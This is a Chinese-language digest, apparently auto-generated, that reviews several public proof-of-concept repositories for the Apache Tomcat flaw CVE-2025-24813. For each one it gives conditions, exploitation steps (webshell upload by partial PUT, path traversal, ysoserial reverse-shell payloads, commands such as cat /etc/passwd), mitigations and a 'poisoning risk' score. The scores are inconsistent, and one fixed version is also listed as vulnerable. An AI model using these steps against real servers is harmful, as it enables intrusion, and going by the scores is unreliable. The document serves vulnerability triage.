    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

提供的代码是一个利用反序列化漏洞进行远程代码执行的POC。它包含一个易受攻击的Servlet（`ExploitServlet.java`），该Servlet接受序列化的Java对象，并使用 `ObjectInputStream` 对其进行反序列化。`SafeGadget.java` 中提供了一个简单的Gadget，它在反序列化时会写入`/tmp/pwn.txt`。利用方式是上传恶意构造的序列化对象到 `/vuln-app/vulnerable_endpoint`，触发反序列化，从而执行任意代码。结合CVE描述，如果Tomcat配置允许，并满足利用条件（partial PUT, session持久化等），则该POC有效。

**投毒风险：**

从代码上看，投毒的概率较低（约 5%）。主要风险点在于`SafeGadget.java`。尽管名称是 "SafeGadget"，但它实际上执行了文件写入操作。这本身不是投毒，而是漏洞利用的一部分。真正的投毒风险可能在于：

1.  **更隐蔽的后门：** 虽然给出的例子写入 "Pwned!" 到文件，但实际的Gadget可能执行更隐蔽的操作，例如添加用户、执行系统命令等。
2.  **供应链投毒：** 如果攻击者能够控制构建环境，他们可能会修改 `ExploitServlet.java` 或添加额外的依赖项，从而引入后门或恶意功能。

由于给出的代码非常简单，并且漏洞利用的目的是明确的（通过反序列化写入文件），因此直接投毒的风险相对较低。但是，在实际的利用场景中，攻击者可能会使用更复杂的Gadget，从而隐藏恶意行为。

**利用方式：**

1.  **信息泄露/文件覆盖：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   目标 URL 是公共上传 URL 的子目录
    *   攻击者知道敏感文件名
    *   敏感文件也使用 partial PUT 上传
    攻击者可以使用路径等价绕过，例如 `public_upload/../../sensitive_file.txt` 覆盖敏感文件。
2.  **远程代码执行：** 如果满足以下条件：
    *   Default Servlet 启用写入
    *   支持 partial PUT
    *   应用使用 Tomcat 的基于文件的会话持久化和默认存储位置
    *   应用包含可用于反序列化攻击的库
    攻击者可以利用反序列化漏洞，例如通过上传恶意构造的序列化session文件到session存储目录中，从而执行任意代码。POC代码展示了基本的反序列化利用方式。实际利用中，需要找到Tomcat实例中可用的Gadget链。 

**项目地址:** [brs6412/CVE-2025-24813](https://github.com/brs6412/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #25

**来源**: [CVE-2025-24813-charis3306_CVE-2025-24813.md](../2025/CVE-2025-24813-charis3306_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价及反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (默认开启), 文件会话持久化启用 (PersistentManager 和 FileStore 配置), 存在反序列化利用链

**POC 可用性:** 是

**投毒风险:** 70%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中的一个路径等价漏洞，结合反序列化漏洞，可能导致远程代码执行。利用方式是攻击者通过 Partial PUT 请求上传恶意序列化 payload，覆盖 session 文件，从而触发反序列化漏洞，执行任意代码。

**漏洞利用过程：**
1.  **配置条件：** 确保 Tomcat 启用了 DefaultServlet 的写入功能，支持 Partial PUT 请求，并且开启了文件会话持久化。
2.  **上传Payload：** 攻击者构造一个包含恶意代码的序列化对象，并将其分块通过 Partial PUT 请求上传到 Tomcat 服务器上的 session 存储目录。
3.  **触发反序列化：** 当 Tomcat 尝试反序列化该 session 文件时，恶意代码会被执行，从而导致远程代码执行。

**投毒风险分析：**
由于该漏洞利用涉及上传恶意序列化数据，存在一定的投毒风险。攻击者可能在序列化数据中植入恶意代码，导致受害者在不知情的情况下运行这些代码。此外，公开的POC可能被篡改并传播，从而导致更多人受到攻击。

**缓解措施：**
1.  升级到 Tomcat 11.0.3, 10.1.35 或 9.0.98 及以上版本。
2.  禁用 DefaultServlet 的写入功能 (readonly=true)。
3.  避免使用文件会话持久化。
4.  限制上传文件类型，并对上传文件进行安全检查。

**项目地址:** [charis3306/CVE-2025-24813](https://github.com/charis3306/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #26

**来源**: [CVE-2025-24813-cyglegit_CVE-2025-24813.md](../2025/CVE-2025-24813-cyglegit_CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 支持partial PUT(默认开启), 使用Tomcat文件session持久化(默认位置), 应用包含可被反序列化利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，允许攻击者利用 'file.Name' (内部点) 绕过安全检查，导致远程代码执行、信息泄露或恶意内容注入。该漏洞利用方式主要依赖于 Tomcat 的 Default Servlet 和 partial PUT 功能。从提供的漏洞库信息和搜索引擎结果来看，该漏洞的利用需要满足多个前提条件：

1.  **Default Servlet 开启写入:** Tomcat 默认禁止 Default Servlet 写入，如果开启则存在风险。
2.  **支持 Partial PUT:**  Tomcat 默认支持 Partial PUT，攻击者可以分块上传文件。
3.  **应用程序使用基于文件的会话持久性，且使用默认存储位置:** 如果应用程序使用 Tomcat 的文件会话持久性，攻击者可以覆盖 session 文件。
4.  **应用包含可被反序列化利用的库:**  攻击者需要找到一个存在反序列化漏洞的库，并构造恶意的序列化对象。

提供的 POC 代码 `cve_2025_24813_poc.py` 看起来是一个较为完整的漏洞利用工具，具备以下功能：

*   多目标扫描和单目标利用。
*   自动检测可用的 gadget chain (CommonsCollections, BeanShell, Spring 等)。
*   操作系统检测和后渗透 payload (Linux/Windows)。
*   从常见 endpoint 中提取 Session ID。
*   支持 HTTPS 和 SSL 验证绕过。

**利用方式总结:**

1.  **检测目标 Tomcat 是否开启了 Default Servlet 的写入功能。**
2.  **如果开启，利用 Partial PUT 功能上传恶意构造的 session 文件。**
3.  **构造恶意的序列化对象，利用目标应用中存在的反序列化漏洞执行任意代码。**
4.  **如果无法直接 RCE，可以尝试利用路径等价漏洞覆盖敏感文件，造成信息泄露。**

**关于投毒风险分析:**

该漏洞利用代码的投毒风险较低 (5%)。虽然代码功能强大，但主要逻辑围绕着已知的漏洞利用展开。需要关注的地方是:

*   `os.system` 或 `subprocess.call` 这类函数，因为它们可以执行任意系统命令。代码中 `subprocess`被用于 `ysoserial` 命令执行,相对安全。
*   Payload 生成部分，需要确保 ysoserial 生成的 payload 符合预期，没有被篡改。
*   结果记录日志是否会在未授权的情况下,将数据上传到服务器.

综合来看，该 POC 具备较高的有效性，但使用时务必谨慎，并在授权环境下进行测试。

**项目地址:** [cyglegit/CVE-2025-24813](https://github.com/cyglegit/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #27

**来源**: [CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md](../2025/CVE-2025-24813-drcrypterdotru_Apache-GOExploiter.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化漏洞

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和/或信息泄露和/或信息篡改

**影响版本:** 9.0.0.M1 <= 版本 <= 9.0.98, 10.1.0-M1 <= 版本 <= 10.1.34, 11.0.0-M1 <= 版本 <= 11.0.2

**利用条件:** Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录, 攻击者知道安全敏感文件的名称, 安全敏感文件也通过 partial PUT 上传。或者 Default Servlet 启用了写入 (默认禁用), 支持 partial PUT (默认启用), 应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置, 应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，通过 ‘file.Name’ (Internal Dot) 导致远程代码执行和/或信息泄露和/或恶意内容添加到通过启用写入的 Default Servlet 上传的文件中。

**漏洞利用方式：**

根据漏洞描述，利用方式有两种：

1.  **信息泄露/内容篡改：** 如果满足以下条件，攻击者可以查看安全敏感文件和/或将内容注入到这些文件中：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件也通过 partial PUT 上传。

2.  **远程代码执行 (RCE)：** 如果满足以下条件，攻击者可以执行远程代码：
    *   启用了 default servlet 的写入功能（默认禁用）。
    *   支持 partial PUT（默认启用）。
    *   应用程序正在使用 Tomcat 的基于文件的会话持久性，且使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**POC代码分析:**

提供的POC代码是一个 Go 语言编写的利用脚本，尝试利用该漏洞上传JSP webshell。

*   **有效性：**
    *   POC代码通过PUT请求上传一个JSP webshell（`SHELL_JSP`）到多个可能的目录（`DIR_List`），文件名为`update_log.jsp`。
    *   POC代码会检测服务器返回的状态码是否为200, 201 或者 204, 并且尝试通过GET请求验证JSP webshell是否成功上传，检查返回内容是否包含 `java.lang.NullPointerException` 或者 webshell内容.
    *   如果上传成功，将 URL 写入 `Shelled.txt` 文件。
    *   代码实现了协议探测函数`DetectProtocol`，尝试使用HTTP和HTTPS访问目标。

    因此，POC代码在特定配置下是有效的。

*   **投毒风险：**

    POC代码的主要目的是利用漏洞上传 webshell，没有发现明显的恶意代码，主要的操作是PUT和GET请求。
    代码中唯一可以算作风险的地方是它会尝试连接目标服务器并上传 webshell。但这些是漏洞利用的必要步骤,没有发现任何作者的私有后门或者恶意代码行为。
    投毒风险极低，可以认为是1%。

**搜索引擎结果:**

搜索引擎结果表明 CVE-2025-24813 漏洞正在被积极利用，攻击者利用该漏洞执行远程代码。

总体而言，CVE-2025-24813 是一个严重的安全漏洞，攻击者可以利用该漏洞执行恶意代码或泄露敏感信息。该漏洞利用的有效性较高，但默认配置下，写入功能是禁用的，漏洞利用条件较为苛刻。

**项目地址:** [drcrypterdotru/Apache-GOExploiter](https://github.com/drcrypterdotru/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #28

**来源**: [CVE-2025-24813-f8l124_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-f8l124_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要Tomcat开启了Default Servlet的写入功能(默认关闭),支持partial PUT(默认开启), 应用使用了Tomcat基于文件的session持久化，并且包含可用于反序列化攻击的库。或者满足敏感文件可被上传的条件。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个Apache Tomcat中的路径等价漏洞，允许未经身份验证的攻击者在特定条件下执行任意代码。根据漏洞库信息和搜索结果，该漏洞的利用依赖于以下几个关键条件：

1.  **Default Servlet 开启写入 (writes enabled for the default servlet)**：默认情况下，Tomcat的Default Servlet的写入功能是禁用的，如果管理员手动开启了该功能，则会增加漏洞被利用的风险。
2.  **支持 Partial PUT (support for partial PUT)**：Tomcat默认开启了对Partial PUT请求的支持，这是漏洞利用的前提条件。
3.  **特定应用场景**：
    *   **远程代码执行 (RCE)**：需要应用程序使用Tomcat基于文件的session持久化，并且包含一个可以被反序列化攻击利用的库。
    *   **信息泄露/恶意内容注入**：需要存在一个用于公共上传的目标URL，以及位于其子目录的安全敏感上传目标URL，攻击者需要知道安全敏感文件的名称，并且也通过partial PUT上传这些文件。

**漏洞利用方式：**

1.  **发送 Partial PUT 请求**：攻击者通过发送特制的 Partial PUT 请求，利用Tomcat处理文件路径时的缺陷，将恶意JSP文件上传到服务器上的特定位置。
2.  **绕过路径检查**：通过构造包含内部点(`.`)的文件名，攻击者可以绕过某些路径检查，将文件写入到目标目录。
3.  **触发代码执行/信息泄露**：
    *   **RCE**：上传包含恶意反序列化payload的JSP文件，当Tomcat尝试加载并反序列化session数据时，触发远程代码执行。
    *   **信息泄露/恶意内容注入**：利用路径等价，覆盖或修改服务器上的敏感文件。

**POC有效性：**

提供的POC代码是一个非破坏性的概念验证，旨在演示漏洞的存在。该POC上传一个无害的JSP文件 (`proof.jsp`) 并尝试访问它，以验证是否可以执行任意代码。从readme可以看出来，这个POC的重点是验证漏洞，而不会做任何破坏。

**投毒风险：**

虽然POC本身声明是无害的，但仍然存在一定的投毒风险。作者有可能在代码中隐藏了一些恶意逻辑，例如：

1.  **不明显的后门代码**：尽管`proof.jsp`本身是无害的，但Python脚本可能包含其他代码，用于在服务器上植入后门或执行其他恶意操作。风险较低，因为代码相对简单且经过了检查，但不能完全排除。
2.  **依赖项投毒**：脚本可能依赖于存在已知漏洞或包含恶意代码的第三方库。但根据描述，需要的依赖非常少。
3.  **元数据欺骗**：作者可能在仓库的元数据（例如，提交历史、作者信息）中隐藏了恶意信息，以误导安全研究人员。风险极低。

综合分析，该仓库存在投毒代码的概率较低，但仍然建议在受控环境中仔细审查代码后再使用。

**结论：**
总的来说，CVE-2025-24813是一个高危漏洞，需要及时修复。虽然提供的POC代码旨在演示漏洞，但使用前务必进行安全审查，以防潜在的投毒风险。

**项目地址:** [f8l124/CVE-2025-24813-POC](https://github.com/f8l124/CVE-2025-24813-POC)

